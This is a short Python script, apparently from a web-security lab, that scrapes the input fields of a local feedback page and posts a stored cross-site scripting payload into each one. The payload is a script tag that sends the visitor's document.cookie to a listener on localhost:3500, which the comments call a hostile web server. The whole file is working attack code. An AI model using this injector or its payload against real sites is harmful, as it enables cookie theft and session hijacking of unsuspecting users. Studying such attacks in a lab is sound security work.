from requests_html import HTMLSession # https://requests.readthedocs.io/projects/requests-html/en/latest/
from bs4 import BeautifulSoup # https://www.crummy.com/software/BeautifulSoup/bs4/doc/

def main():
    session = HTMLSession() # Initilise HTML session

    page = session.get('http://localhost:5000/feedback') # Get content of public feedback page
    soup = BeautifulSoup(page.content, "lxml") # Parse content with beautiful soup as lxml
    print(soup) # Print parsed data
    payload = {} # define payload dict
    search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # Search for elements with name 'input' in soup output [10]
    print(search) # print search output
    for x in search: # Iterate for every input found in search
        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"}) # Create payload script using an image to load the local client cookies onto the hostile web server [11]
    r = session.post('http://localhost:5000/feedback',payload) # Post payload to client
    print("Payload sent")

    ''' Not used
    render_page = render_session.get('http://localhost:5000/feedback')
    render_page.html.render()
    html = render_page.html.html
    render_soup = BeautifulSoup(html, "lxml")
    title = render_soup.title.string
    print(title)
    if title == "XSS Vulnerable":
            print("The scanned page is vulnerable to XSS")
    '''

main()
